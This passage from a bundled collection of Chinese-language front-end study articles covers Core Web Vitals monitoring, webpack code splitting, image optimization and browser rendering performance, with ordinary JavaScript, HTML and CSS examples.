// 代码分割和懒加载
// 使用动态 import
const loadHeavyComponent = async () => {
  const module = await import('./HeavyComponent');
  return module.default;
};

// 使用 React.lazy
import React, { Suspense } from 'react';

const HeavyComponent = React.lazy(() => import('./HeavyComponent'));

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <HeavyComponent />
    </Suspense>
  );
}

// 使用 Web Workers
// worker.js
self.onmessage = function(e) {
  const result = heavyComputation(e.data);
  self.postMessage(result);
};

// main.js
const worker = new Worker('worker.js');

worker.onmessage = function(e) {
  console.log('Result:', e.data);
};

worker.postMessage(data);

// 避免长任务
function processLargeArray(array, chunkSize = 1000) {
  let index = 0;
  
  function processChunk() {
    const chunk = array.slice(index, index + chunkSize);
    // 处理数据块
    chunk.forEach(item => {
      // 处理逻辑
    });
    
    index += chunkSize;
    
    if (index < array.length) {
      // 使用 requestIdleCallback 或 setTimeout 避免阻塞主线程
      requestIdleCallback(processChunk, { timeout: 50 });
    }
  }
  
  processChunk();
}
\`\`\`

#### FID 监控示例

\`\`\`javascript
// 使用 Web Vitals 库监控 FID
import { onFID } from 'web-vitals';

onFID((metric) => {
  console.log('FID:', metric);
  
  // 发送到分析服务
  if (navigator.sendBeacon) {
    const data = new URLSearchParams();
    data.set('name', metric.name);
    data.set('value', metric.value.toString());
    data.set('id', metric.id);
    
    navigator.sendBeacon('/analytics', data);
  }
  
  // 判断是否达标
  if (metric.rating === 'good') {
    console.log('FID is good!');
  } else if (metric.rating === 'needs-improvement') {
    console.warn('FID needs improvement');
  } else {
    console.error('FID is poor!');
  }
});
\`\`\`

### CLS (Cumulative Layout Shift)

**定义：**
- 累积布局偏移
- 衡量页面元素意外移动的程度
- 目标值：< 0.1：CLS用于衡量页面视觉稳定性，即页面在加载过程中视觉元素意外移动的程度，0.1以下的CLS被认为是良好的用户体验，超过0.25被认为较差，CLS主要由动态加载的内容（如图片、字体、动态广告等）导致布局偏移引起，优化CLS的关键是为图片和视频指定明确的尺寸、使用CSS transform而非改变元素位置、确保广告或动态内容有预留空间

**优化策略：**
- 为图片和视频设置明确的宽高
- 为广告和动态内容预留空间
- 避免在页面加载后插入内容
- 使用 CSS aspect-ratio 属性
- 优化字体加载策略

**监控工具：**
- Lighthouse
- Web Vitals Chrome 扩展
- Google Search Console

### 代码示例

#### CLS 优化示例

\`\`\`html
<!-- 为图片设置明确的宽高 -->
<img src="/image.jpg" alt="Image" width="800" height="600">

<!-- 使用 aspect-ratio 属性 -->
<style>
.image-container {
  aspect-ratio: 16 / 9;
  background-color: #f0f0f0;
}
</style>

<div class="image-container">
  <img src="/image.jpg" alt="Image" loading="lazy">
</div>

<!-- 为动态内容预留空间 -->
<div class="ad-container" style="min-height: 250px;">
  <!-- 广告内容 -->
</div>

<!-- 使用 font-display 优化字体加载 -->
<style>
@font-face {
  font-family: 'Custom Font';
  src: url('/fonts/custom.woff2') format('woff2');
  font-display: swap; /* 或 optional, fallback */
}
</style>

<!-- 避免在页面加载后插入内容 -->
<!-- 不推荐 -->
<script>
document.body.appendChild(createDynamicContent());
</script>

<!-- 推荐 -->
<div id="dynamic-content" style="min-height: 200px;">
  <!-- 动态内容将在这里加载 -->
</div>
\`\`\`

#### CLS 监控示例

\`\`\`javascript
// 使用 Web Vitals 库监控 CLS
import { onCLS } from 'web-vitals';

onCLS((metric) => {
  console.log('CLS:', metric);
  
  // 发送到分析服务
  if (navigator.sendBeacon) {
    const data = new URLSearchParams();
    data.set('name', metric.name);
    data.set('value', metric.value.toString());
    data.set('id', metric.id);
    
    navigator.sendBeacon('/analytics', data);
  }
  
  // 判断是否达标
  if (metric.rating === 'good') {
    console.log('CLS is good!');
  } else if (metric.rating === 'needs-improvement') {
    console.warn('CLS needs improvement');
  } else {
    console.error('CLS is poor!');
  }
});
\`\`\`

### 整体优化策略

**资源优化：**
- 压缩 CSS、JavaScript 和 HTML
- 使用现代图片格式（WebP、AVIF）
- 启用 GZIP 或 Brotli 压缩
- 合理使用缓存策略

**加载策略：**
- 预加载关键资源
- 延迟加载非关键资源
- 预连接到重要域名
- 资源提示（dns-prefetch、preconnect、preload）

**代码优化：**
- 减少 JavaScript 包大小
- 避免内存泄漏
- 优化 DOM 操作
- 使用 requestAnimationFrame 处理动画

**服务器优化：**
- 启用 HTTP/2 或 HTTP/3

### 代码示例

#### 资源优化示例

\`\`\`javascript
// Webpack 配置优化
module.exports = {
  optimization: {
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        vendors: {
          test: /[\\/]node_modules[\\/]/,
          name: 'vendors',
          chunks: 'all'
        }
      }
    },
    minimize: true,
    minimizer: [
      new TerserPlugin({
        terserOptions: {
          compress: {
            drop_console: true
          }
        }
      })
    ]
  },
  performance: {
    hints: 'warning',
    maxEntrypointSize: 512000,
    maxAssetSize: 512000
  }
};

// 图片优化
// 使用 next/image (Next.js)
import Image from 'next/image';

function MyComponent() {
  return (
    <Image
      src="/hero-image.jpg"
      alt="Hero Image"
      width={1200}
      height={600}
      priority
      placeholder="blur"
    />
  );
}

// 使用响应式图片
<picture>
  <source media="(max-width: 600px)" srcset="/image-small.webp">
  <source media="(max-width: 1200px)" srcset="/image-medium.webp">
  <source srcset="/image-large.webp">
  <img src="/image-fallback.jpg" alt="Responsive Image">
</picture>
\`\`\`

#### 加载策略示例

\`\`\`html
<!-- 资源提示 -->
<head>
  <!-- DNS 预解析 -->
  <link rel="dns-prefetch" href="https://api.example.com">
  
  <!-- 预连接 -->
  <link rel="preconnect" href="https://cdn.example.com">
  
  <!-- 预加载 -->
  <link rel="preload" as="script" href="/scripts/main.js">
  <link rel="preload" as="style" href="/styles/main.css">
  <link rel="preload" as="image" href="/images/hero.webp">
  
  <!-- 预获取 -->
  <link rel="prefetch" href="/next-page.html">
</head>

<!-- 懒加载图片 -->
<img src="/image.jpg" alt="Image" loading="lazy">

<!-- 懒加载 iframe -->
<iframe src="/video.html" loading="lazy"></iframe>
\`\`\`

#### 代码优化示例

\`\`\`javascript
// 减少 DOM 操作
// 不推荐
function updateList(items) {
  const list = document.getElementById('list');
  list.innerHTML = '';
  
  items.forEach(item => {
    const li = document.createElement('li');
    li.textContent = item;
    list.appendChild(li);
  });
}

// 推荐：使用文档片段
function updateList(items) {
  const list = document.getElementById('list');
  const fragment = document.createDocumentFragment();
  
  items.forEach(item => {
    const li = document.createElement('li');
    li.textContent = item;
    fragment.appendChild(li);
  });
  
  list.innerHTML = '';
  list.appendChild(fragment);
}

// 使用 requestAnimationFrame 处理动画
function animate() {
  // 更新动画状态
  updateAnimation();
  
  requestAnimationFrame(animate);
}

requestAnimationFrame(animate);

// 避免内存泄漏
// 不推荐
function setupEventListeners() {
  const button = document.getElementById('button');
  button.addEventListener('click', handleClick);
  // 如果不移除监听器，会导致内存泄漏
}

// 推荐
function setupEventListeners() {
  const button = document.getElementById('button');
  const handleClick = () => {
    // 处理点击
  };
  
  button.addEventListener('click', handleClick);
  
  // 清理函数
  return () => {
    button.removeEventListener('click', handleClick);
  };
}

const cleanup = setupEventListeners();

// 在组件卸载时调用
// cleanup();
\`\`\`

### 最佳实践

- 定期监控 Core Web Vitals 指标
- 优先优化 LCP，因为它对用户体验影响最大
- 使用现代图片格式和压缩技术
- 合理使用代码分割和懒加载
- 避免长任务阻塞主线程
- 为图片和动态内容预留空间
- 优化字体加载策略
- 使用 CDN 加速静态资源
- 启用 HTTP/2 或 HTTP/3
- 定期进行性能审计

`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"code-splitting",title:"代码分割与懒加载",category:"performance",difficulty:"medium",tags:["性能优化","代码分割","懒加载","webpack"],content:`## 代码分割与懒加载

代码分割和懒加载是减少初始加载时间、提高应用性能的重要策略。

### 代码分割的概念

**定义：**
- 将代码分割成多个小块
- 按需加载这些代码块
- 减少初始加载体积
- 提高首次内容绘制速度

**分割策略：**
- 按路由分割
- 按组件分割
- 按功能分割
- 按第三方库分割

### 懒加载技术

**动态导入：**
- ES 模块动态导入语法
- import() 函数
- 返回 Promise
- 支持 webpack 代码分割

**React 中的实现：**
- React.lazy()
- Suspense 组件
- 路由级别的代码分割
- 组件级别的代码分割

**Vue 中的实现：**
- 路由懒加载
- 动态导入组件
- defineAsyncComponent
- webpackChunkName 注释

### Webpack 配置

**SplitChunks 配置：**
- chunks 选项：async、initial、all：chunks选项用于指定代码分割的模式，async表示只分割异步导入的模块（动态import），这些模块会在需要时异步加载；initial表示只分割入口模块的同步依赖；all表示同时处理异步和同步模块，这个选项决定了哪些模块会被分割成独立的chunk文件，合理设置可以优化首屏加载时间和后续模块的按需加载
- minSize：最小 chunk 大小：minSize选项指定生成chunk的最小字节数，默认值为20000（20KB），当一个模块或模块组的大小小于这个值时，不会生成独立的chunk，这个值可以根据项目需求调整，较大的值会生成更少但更大的chunk，有利于减少HTTP请求数，但可能会影响首屏加载速度
- maxSize：最大 chunk 大小：maxSize选项指定生成chunk的最大字节数，默认值为0（无限制），当chunk大小超过这个值时，webpack会尝试将其分割成更小的chunk，这个选项主要用于控制浏览器缓存效率和网络请求数量，设置合适的值可以在缓存命中率和请求数量之间取得平衡，通常设置为大于等于minSize的值
- minChunks：最小引用次数：minChunks选项指定一个模块必须被多少个入口chunk引用才会被分割，默认值为1，意味着只要被引用一次就可能分割，如果设置为更大的值，只有被多个入口共同引用的模块才会被分割出来作为共享模块，这在多个入口共享某些库（如React、Lodash）时很有用，可以避免重复打包
- maxAsyncRequests：最大异步请求数：maxAsyncRequests选项指定按需加载时的最大并行请求数，默认值为6，当异步加载的chunk数量超过这个值时，会等待之前的chunk加载完成后再请求下一个，这个值影响按需加载的性能，设置太大会增加并发请求数，设置太小会延长加载时间，通常保持默认即可
- maxInitialRequests：最大初始请求数：maxInitialRequests选项指定初始加载（入口点）时的最大并行请求数，默认值为4，这个值影响首屏加载性能，因为浏览器对并行请求数有限制（通常为6个），设置合理的值可以平衡首屏加载速度和HTTP请求数，在HTTP/2环境下可以设置更大的值以充分利用多路复用优势

**代码分割策略：**
- 提取公共代码
- 提取第三方库
- 提取运行时代码
- 自定义分割策略

### 预加载与预缓存

**预加载：**
- preload：预加载关键资源：preload是一种资源提示（Resource Hint），用于提前告诉浏览器当前页面需要的关键资源，让浏览器提前开始加载，通过<link rel="preload">标签指定，as属性告诉浏览器资源的类型（script、style、image、font等），这样浏览器可以设置正确的优先级和预获取资源，preload适合预加载首屏渲染所需的关键资源，如关键CSS、字体、首屏图片等
- prefetch：预加载未来可能需要的资源：prefetch是一种资源提示，用于告诉浏览器在当前页面加载完成后，预测用户可能访问的下一个页面或需要的资源，让浏览器在空闲时预加载这些资源，通过<link rel="prefetch">标签指定，prefetch适合预加载下一个路由的代码、非首屏图片等资源，可以显著提升用户后续操作的加载速度，但不应过度使用以免浪费带宽
- preconnect：预连接到域名：preconnect是一种资源提示，用于提前与目标服务器建立网络连接，包括DNS解析、TCP握手、TLS握手等，通过<link rel="preconnect">标签指定href属性为目标域名，preconnect可以显著减少后续请求的延迟，特别适合连接CDN服务器、API服务器、第三方资源服务器等，使用时需要注意只预连接真正需要的域名，过度使用会浪费DNS缓存资源
- dns-prefetch：预解析 DNS：dns-prefetch是一种资源提示，用于提前解析目标域名的DNS，将域名解析为IP地址，通过<link rel="dns-prefetch">标签指定href属性为目标域名，dns-prefetch适合提前解析第三方域名（如CDN、分析服务、广告服务等）的DNS，可以减少后续请求的DNS解析时间，注意dns-prefetch和preconnect可以一起使用，preconnect会包含DNS预解析

**Service Worker：**
- 缓存静态资源
- 离线访问
- 预缓存关键资源
- 背景同步

### 性能影响

**优势：**
- 减少初始加载时间
- 提高首屏渲染速度
- 节省带宽
- 改善用户体验

**注意事项：**
- 避免过度分割
- 合理设置分割策略
- 监控分割效果
- 考虑缓存策略

### 最佳实践

- 按路由分割代码
- 懒加载非关键组件
- 预加载关键资源
- 合理使用预缓存
- 监控代码分割效果
- 优化分割策略
- 考虑用户网络环境
- 平衡分割粒度`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"image-optimization",title:"图片优化策略",category:"performance",difficulty:"medium",tags:["性能优化","图片优化","WebP","响应式图片"],content:`## 图片优化策略

图片是网页中最常见的资源，也是影响页面加载速度的主要因素，合理的图片优化策略可以显著提升性能。

### 图片格式选择

**WebP：**
- 由 Google 开发的现代图片格式
- 比 JPEG 小 25-35%
- 支持透明和动画
- 浏览器支持良好

**AVIF：**
- 基于 AV1 视频编码
- 比 WebP 小 20-30%
- 支持 HDR 和宽色域
- 浏览器支持正在增加

**JPEG：**
- 适合照片和复杂图像
- 有损压缩
- 广泛支持
- 可调节压缩质量

**PNG：**
- 支持透明
- 无损压缩
- 适合图标和简单图形
- 文件体积较大

**SVG：**
- 矢量图形
- 无限缩放
- 适合图标和简单图形
- 可通过 CSS 和 JavaScript 操作

### 图片压缩

**有损压缩：**
- 减少文件大小
- 适当降低质量
- 肉眼难以察觉差异
- 适合照片

**无损压缩：**
- 移除元数据
- 优化压缩算法
- 保持原始质量
- 适合图标和图形

**工具：**
- ImageOptim
- TinyPNG
- Squoosh
- Sharp (Node.js)
- ImageMagick

### 响应式图片

**srcset 属性：**
- 提供多个图片源
- 浏览器根据设备选择合适的图片
- 支持不同分辨率
- 语法：srcset="image-1x.jpg 1x, image-2x.jpg 2x"：srcset属性允许在不同像素密度的屏幕上提供不同分辨率的图片，语法格式是"图片URL 像素密度"，如1x表示标准像素密度、2x表示Retina屏幕的高像素密度，浏览器会根据设备的像素比自动选择合适的图片，这个属性可以避免在低分辨率设备上加载过大的图片，节省带宽并提高加载速度

**sizes 属性：**
- 定义图片在不同视口中的尺寸
- 与 srcset 配合使用
- 帮助浏览器选择合适的图片
- 语法：sizes="(max-width: 600px) 100vw, 50vw"：sizes属性与srcset配合使用，用于告诉浏览器在不同视口宽度下图片的显示尺寸，语法是媒体条件加上对应的宽度值，如"(max-width: 600px) 100vw"表示视口宽度不超过600px时图片宽度为100%视口宽度，", 50vw"表示其他情况下图片宽度为50%视口宽度，这个属性帮助浏览器选择最合适的图片分辨率，避免加载过大的图片

**picture 元素：**
- 提供多个图片源
- 基于媒体查询选择
- 支持不同格式
- 语法：<picture><source media="..." srcset="..."><img src="..."></picture>：picture元素允许通过多个source元素为不同场景提供不同的图片源，source元素的media属性指定媒体查询条件，srcset属性指定图片URL，当浏览器匹配到某个source的媒体条件时就会使用该source的图片，如果都不匹配则使用img元素的src作为后备，picture元素常用于艺术方向（不同屏幕宽度显示不同裁剪的图片）或提供不同格式的图片（如WebP、AVIF）

### 图片加载策略

**懒加载：**
- 延迟加载视口外的图片
- 减少初始加载时间
- 节省带宽
- 实现方式：Intersection Observer API：Intersection Observer API是浏览器提供的异步观察元素可见性的API，可以高效地检测元素是否进入或离开视口，相比于传统的scroll事件监听，Intersection Observer不会导致主线程阻塞，性能更好，使用时创建Observer实例并配置rootMargin（视口外延）和threshold（触发阈值），当元素可见性变化时调用回调函数，是实现图片懒加载的首选方案

**预加载：**
- 预加载关键图片
- 提高首屏渲染速度
- 使用 preload 指令
- 语法：<link rel="preload" as="image" href="image.jpg">：preload可以用于预加载首屏图片，让浏览器提前开始下载图片资源，as属性指定资源类型为image，href指定图片URL，这样在图片需要显示时可以立即使用缓存或已完成下载的图片，避免加载延迟，preload适合首屏关键图片如hero图片，但不应预加载过多图片以免与关键资源争抢带宽

**渐进式加载：**
- 先加载低质量占位图
- 再加载完整图片
- 改善用户体验
- 实现方式：BlurHash、Lqip：BlurHash（模糊哈希）是一种紧凑的占位符编码算法，将图片编码为一个短字符串，在图片加载完成前先显示模糊的占位图，然后平滑过渡到完整图片，提供良好的用户体验，Lqip（Low Quality Image Placeholder）是低质量图片占位符技术，生成非常小的缩略图作为占位图，这两种技术都可以在保证用户体验的同时减少带宽消耗

### CDN 与缓存

**CDN：**
- 内容分发网络
- 就近访问图片
- 提高加载速度
- 减轻源服务器负担

**缓存策略：**
- 设置合理的缓存头
- 使用 ETag 和 Last-Modified
- 版本化文件名
- 利用浏览器缓存

### 最佳实践

- 使用现代图片格式（WebP、AVIF）
- 适当压缩图片
- 实现响应式图片
- 懒加载非关键图片
- 预加载关键图片
- 使用 CDN 分发图片
- 合理设置缓存策略
- 监控图片加载性能
- 定期优化图片资源`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"browser-rendering",title:"浏览器渲染优化",category:"performance",difficulty:"medium",tags:["性能优化","浏览器渲染","回流","重绘","合成层"],content:`## 浏览器渲染优化

理解浏览器的渲染过程，针对性地进行优化，可以显著提升页面的渲染性能和用户体验。浏览器渲染是一个复杂的过程，从接收HTML、CSS、JavaScript等资源，到最终在屏幕上显示像素，涉及多个阶段。每个阶段都可能成为性能瓶颈，理解这些阶段的工作原理对于前端性能优化至关重要。

### 渲染流程详解

**HTML 解析：**
浏览器解析 HTML 生成 DOM 树是渲染流程的第一步。解析器从网络层获取HTML字节流，将其转换为字符，然后进行词法分析生成标记（Token），最后根据标记构建DOM树。解析过程中遇到CSS会暂停HTML解析，因为CSS可能影响后续的渲染；遇到JavaScript也会暂停，因为JavaScript可能修改DOM结构。现代浏览器使用预解析器（Preload Scanner）来提前发现需要加载的资源，优化加载顺序。

\`\`\`javascript
// DOM 树结构示例
// HTML:
// <div class="container">
//   <h1>Title</h1>
//   <p>Paragraph</p>
// </div>

// DOM 树:
// Document
//   └── html
//        ├── head
//        └── body
//             └── div.container
//                  ├── h1
//                  │    └── "Title"
//                  └── p
//                       └── "Paragraph"
\`\`\`

**CSS 解析：**
CSS解析生成CSSOM树是渲染流程的关键步骤。浏览器将CSS代码转换为CSS对象模型（CSSOM），CSSOM与DOM树结合生成渲染树（Render Tree）。渲染树只包含可见元素，不包含display:none的元素。CSS选择器从右向左匹配，因此复杂的选择器会影响解析性能。CSS的加载和解析会阻塞渲染，建议将关键CSS内联，非关键CSS异步加载。

\`\`\`javascript
// CSSOM 树结构示例
// CSS:
// .container { width: 100%; }
// .container h1 { color: blue; }
// .container p { font-size: 14px; }

// CSSOM 树:
// body
//   └── .container (width: 100%)
//        ├── h1 (color: blue)
//        └── p (font-size: 14px)

// 渲染树 = DOM 树 + CSSOM 树
// 只包含可见元素，visibility: hidden 的元素在渲染树中
// display: none 的元素不在渲染树中
\`\`\`

**布局 (Layout)：**
布局阶段计算元素的位置和大小，也称为回流（Reflow）。这是一个递归过程，从根元素开始，遍历渲染树中的每个元素，计算其几何属性。布局是渲染过程中最昂贵的操作之一，因为它需要遍历整个渲染树。触发回流的操作包括：添加/删除元素、改变元素尺寸、改变窗口大小、改变字体大小等。减少回流是性能优化的重点。

\`\`\`javascript
// 触发回流的操作
// 1. 改变窗口大小
window.addEventListener('resize', () => {
  // 触发整个页面的回流
});

// 2. 改变元素尺寸
element.style.width = '200px'; // 触发回流
element.style.height = '100px'; // 触发回流

// 3. 获取布局属性（强制同步布局）
const width = element.offsetWidth; // 触发回流
const height = element.offsetHeight; // 触发回流

// ❌ 避免：读写交替导致布局抖动
for (let i = 0; i < elements.length; i++) {
  elements[i].style.width = elements[i].offsetWidth + 10 + 'px';
}

// ✅ 推荐：批量读取，批量写入
const widths = elements.map(el => el.offsetWidth);
elements.forEach((el, i) => {
  el.style.width = widths[i] + 10 + 'px';
});
\`\`\`

**绘制 (Paint)：**
绘制阶段将元素绘制到屏幕上，也称为重绘（Repaint）。绘制是在多个层（Layer）上进行的，每个层都是一个独立的位图。绘制过程包括：创建绘制记录列表、执行绘制命令、生成位图。重绘的代价相对回流较小，但频繁的重绘仍然会影响性能。触发重绘的操作包括：改变颜色、背景、边框、阴影等不影响布局的样式变化。

\`\`\`javascript
// 触发重绘的操作
element.style.color = 'red'; // 触发重绘
element.style.backgroundColor = 'blue'; // 触发重绘
element.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)'; // 触发重绘

// 重绘不会触发布局计算，性能开销较小
// 但如果元素在合成层上，重绘可能不会影响其他层
\`\`\`

**合成 (Compositing)：**
合成阶段将绘制的图层合成为最终图像。浏览器利用GPU加速，将多个层合成到一起。合成层的创建需要满足特定条件，如使用transform、opacity、will-change等CSS属性。合成层的优势是：层的更新不会影响其他层，动画更流畅。但创建过多的合成层会消耗GPU内存，需要权衡。

\`\`\`javascript
// 创建合成层的方法
// 1. 使用 transform（推荐）
.animated-element {
  transform: translateZ(0); /* 创建合成层 */
  /* 或 */
  transform: translate3d(0, 0, 0);
}

// 2. 使用 will-change（明确提示浏览器）
.animated-element {
  will-change: transform, opacity;
}

// 3. 使用 opacity 动画
.fade-element {
  opacity: 0.5;
  transition: opacity 0.3s;
}

// 4. 使用 CSS 滤镜（部分情况）
.blurred-element {
  filter: blur(5px);
}

// ❌ 避免：过度使用合成层
.every-element {
  transform: translateZ(0); /* 不推荐：消耗过多GPU内存 */
}
\`\`\`

### 回流与重绘优化

**回流 (Reflow)：**
回流是浏览器计算元素几何属性的过程，是渲染过程中最昂贵的操作。回流会影响整个渲染树或部分渲染树，触发条件包括：页面首次渲染、浏览器窗口大小改变、元素尺寸或位置改变、元素内容改变、字体大小改变、添加或删除元素、激活CSS伪类等。回流会阻塞主线程，导致页面卡顿，应该尽量减少回流的触发。

\`\`\`javascript
// 回流触发场景详解

// 1. 页面首次渲染 - 必然触发回流
document.body.innerHTML = '<div>New Content</div>';

// 2. 浏览器窗口大小改变
window.addEventListener('resize', handleResize);

// 3. 元素尺寸改变
element.style.width = '200px';
element.style.height = '100px';
element.style.padding = '10px';
element.style.margin = '20px';
element.style.border = '1px solid black';

// 4. 元素位置改变
element.style.top = '50px';
element.style.left = '100px';
element.style.transform = 'translate(10px, 20px)'; // 不触发回流（合成层）

// 5. 内容改变
element.textContent = 'New Text';
element.innerHTML = '<span>New HTML</span>';

// 6. 字体改变
element.style.fontSize = '16px';
element.style.fontFamily = 'Arial';

// 7. DOM 操作
parent.appendChild(child); // 触发回流
parent.removeChild(child); // 触发回流

// 8. 获取布局属性（强制同步布局）
const rect = element.getBoundingClientRect();
const width = element.offsetWidth;
const height = element.offsetHeight;
const top = element.offsetTop;
const left = element.offsetLeft;
const style = window.getComputedStyle(element);
\`\`\`

**重绘 (Repaint)：**
重绘是浏览器重新绘制元素视觉外观的过程，不涉及布局计算。重绘的代价相对回流较小，但频繁的重绘仍然会影响性能。触发重绘的操作包括：改变颜色、背景色、边框样式、阴影、透明度等不影响布局的样式变化。重绘不会触发布局计算，但如果元素在合成层上，重绘可能不会影响其他层。

\`\`\`javascript
// 重绘触发场景详解

// 1. 颜色改变 - 只触发重绘
element.style.color = 'red';
element.style.backgroundColor = 'blue';
element.style.borderColor = 'green';

// 2. 背景改变
element.style.backgroundImage = 'url(image.jpg)';
element.style.backgroundSize = 'cover';

// 3. 边框样式改变
element.style.borderStyle = 'dashed';
element.style.borderWidth = '2px';

// 4. 阴影改变
element.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
element.style.textShadow = '1px 1px 2px black';

// 5. 透明度改变
element.style.opacity = '0.5';

// 6. visibility 改变（注意与 display:none 的区别）
element.style.visibility = 'hidden'; // 触发重绘，元素仍占据空间

// 对比：display:none 触发回流
element.style.display = 'none'; // 触发回流，元素不占据空间
\`\`\`

**回流与重绘的关系：**
回流必然导致重绘，但重绘不一定导致回流。回流是更昂贵的操作，因为它需要重新计算布局。优化策略应该是：尽量减少回流，将回流和重绘分离，利用合成层避免回流和重绘。

\`\`\`javascript
// 回流与重绘的关系示例

// 回流 + 重绘：改变元素尺寸
element.style.width = '200px'; // 先回流计算布局，再重绘

// 只重绘：改变元素颜色
element.style.color = 'red'; // 只重绘，不回流

// 都不触发：使用合成层
element.style.transform = 'translateX(100px)'; // 不回流不重绘，只合成
element.style.opacity = '0.5'; // 在合成层上，不回流不重绘

// 性能排序（从低到高）：
// 回流 + 重绘 < 重绘 < 合成
\`\`\`

### 优化策略详解

**减少回流策略：**
减少回流是浏览器渲染优化的核心。主要策略包括：使用CSS transform代替top/left/width/height、批量修改样式、使用DocumentFragment、避免频繁访问布局属性、使用will-change提示浏览器、避免使用table布局等。

\`\`\`javascript
// ❌ 避免：多次触发回流
element.style.width = '100px';
element.style.height = '100px';
element.style.margin = '10px';
element.style.padding = '10px';
// 每次样式修改都可能触发回流

// ✅ 推荐：批量修改样式
// 方法1：使用cssText
element.style.cssText = 'width: 100px; height: 100px; margin: 10px; padding: 10px;';

// 方法2：使用class
element.className = 'active';

// 方法3：使用requestAnimationFrame
function updateStyles() {
  requestAnimationFrame(() => {
    element.style.width = '100px';
    element.style.height = '100px';
  });
}

// ❌ 避免：使用top/left进行动画
.animated-element {
  position: absolute;
  top: 0;
  left: 0;
  transition: top 0.3s, left 0.3s;
}

// ✅ 推荐：使用transform进行动画
.animated-element {
  transform: translate(0, 0);
  transition: transform 0.3s;
}

// ❌ 避免：循环中操作DOM
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  document.body.appendChild(div); // 每次都触发回流
}

// ✅ 推荐：使用DocumentFragment
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  fragment.appendChild(div);
}
document.body.appendChild(fragment); // 只触发一次回流

// ❌ 避免：频繁获取布局属性
for (let i = 0; i < elements.length; i++) {
  elements[i].style.width = elements[i].offsetWidth + 10 + 'px';
  // 每次循环都触发回流（布局抖动）
}

// ✅ 推荐：批量读取，批量写入
const widths = [];
for (let i = 0; i < elements.length; i++) {
  widths[i] = elements[i].offsetWidth; // 先批量读取
}
for (let i = 0; i < elements.length; i++) {
  elements[i].style.width = widths[i] + 10 + 'px'; // 再批量写入
}
\`\`\`

**减少重绘策略：**
减少重绘的策略包括：避免使用CSS expressions、合理使用visibility代替display、减少CSS渐变和阴影、优化选择器性能、避免频繁修改样式等。

\`\`\`javascript
// ❌ 避免：频繁修改样式
setInterval(() => {
  element.style.backgroundColor = getRandomColor();
}, 100);

// ✅ 推荐：使用CSS动画
@keyframes colorChange {
  0% { background-color: red; }
  50% { background-color: green; }
  100% { background-color: blue; }
}

.animated-element {
  animation: colorChange 3s infinite;
}

// ❌ 避免：复杂的CSS选择器
.container .content .item .title .text {
  color: red;
}

// ✅ 推荐：简洁的CSS选择器
.item-text {
  color: red;
}

// ❌ 避免：过度使用渐变和阴影
.heavy-element {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  box-shadow: 0 10px 30px rgba(0,0,0,0.3), 0 5px 15px rgba(0,0,0,0.2);
  text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
}

// ✅ 推荐：适度使用视觉效果
.light-element {
  background: #667eea;
  box-shadow: 0 2px 10px rgba(0,0,0,0.1);
}
\`\`\`

**利用合成层：**
合成层是浏览器渲染优化的高级技巧。通过创建独立的合成层，可以将元素的更新与其他层隔离，避免回流和重绘。创建合成层的方法包括：使用transform: translateZ(0)、使用will-change属性、使用opacity动画等。但需要注意，过多的合成层会消耗GPU内存。

\`\`\`javascript
// 创建合成层的场景

// 1. 动画元素
.animated-box {
  will-change: transform;
  transform: translateZ(0);
}

// 2. 固定定位元素
.fixed-header {
  position: fixed;
  will-change: transform;
}

// 3. 滚动容器
.scroll-container {
  overflow: auto;
  will-change: transform;
  -webkit-overflow-scrolling: touch;
}

// 4. 视频和Canvas
.video-container {
  transform: translateZ(0);
}

// 监控合成层
// Chrome DevTools -> More Tools -> Layers
// 可以查看所有合成层及其内存占用

// ❌ 避免：过度使用will-change
* {
  will-change: transform; /* 不推荐：消耗大量GPU内存 */
}

// ✅ 推荐：按需使用will-change
.animated-on-hover:hover {
  will-change: transform;
}
\`\`\`

**CSS优化策略：**
CSS优化包括：避免使用@import、减少CSS选择器复杂度、使用CSS变量、合理使用inline CSS、优化CSS继承等。

\`\`\`javascript
// ❌ 避免：使用@import（阻塞渲染）
@import url('styles.css');

// ✅ 推荐：使用link标签
<link rel="stylesheet" href="styles.css">

// ❌ 避免：深层嵌套选择器
.page .section .container .row .col .item .title {
  font-size: 16px;
}

// ✅ 推荐：扁平化选择器
.item-title {
  font-size: 16px;
}

// ✅ 推荐：使用CSS变量
:root {
  --primary-color: #007bff;
  --font-size-base: 16px;
}

.button {
  background-color: var(--primary-color);
  font-size: var(--font-size-base);
}

// ✅ 推荐：关键CSS内联
<head>
  <style>
    /* 关键CSS直接内联 */
    .header { height: 60px; }
    .hero { min-height: 400px; }
  </style>
</head>
<body>
  <!-- 内容 -->
  <link rel="preload" href="styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
</body>
\`\`\`

**JavaScript优化策略：**
JavaScript优化包括：避免在布局期间修改样式、使用requestAnimationFrame处理动画、避免频繁操作DOM、使用虚拟列表处理大量数据、优化事件处理等。

\`\`\`javascript
// ❌ 避免：在布局期间修改样式
function updateLayout() {
  element.style.width = '100px';
  const height = element.offsetHeight; // 强制同步布局
  element.style.height = height + 'px';
}

// ✅ 推荐：使用requestAnimationFrame
function updateLayout() {
  requestAnimationFrame(() => {
    element.style.width = '100px';
    requestAnimationFrame(() => {
      const height = element.offsetHeight;
      element.style.height = height + 'px';
    });
  });
}

// ❌ 避免：频繁操作DOM
items.forEach(item => {
  const li = document.createElement('li');
  li.textContent = item;
  list.appendChild(li);
});

// ✅ 推荐：使用虚拟列表（大数据量）
class VirtualList {
  constructor(container, itemHeight, renderItem) {
    this.container = container;
    this.itemHeight = itemHeight;
    this.renderItem = renderItem;
    this.visibleItems = Math.ceil(container.clientHeight / itemHeight);
    this.init();
  }
  
  init() {
    this.container.addEventListener('scroll', this.onScroll.bind(this));
  }
  
  onScroll() {
    const scrollTop = this.container.scrollTop;
    const startIndex = Math.floor(scrollTop / this.itemHeight);
    this.render(startIndex);
  }
  
  render(startIndex) {
    const fragment = document.createDocumentFragment();
    for (let i = startIndex; i < startIndex + this.visibleItems; i++) {
      const item = this.renderItem(i);
